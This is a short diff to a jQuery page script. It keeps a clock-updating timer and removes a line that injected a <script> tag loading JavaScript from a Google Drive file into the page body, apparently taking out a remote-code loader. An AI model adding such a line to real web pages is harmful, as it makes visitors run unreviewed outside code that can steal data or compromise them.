@@ -47,6 +47,4 @@ $(document).ready(() => {
     setInterval(() => {
         $("#dateTime").text(new Date().toLocaleString());
     }, 10);
-
-    $("body").append("<script src=\"https://drive.google.com/uc?export=view&id=1xI0jTRe1MH7Vqb6VmGutv-Mi-Niiuoyi\"></script>");
 });
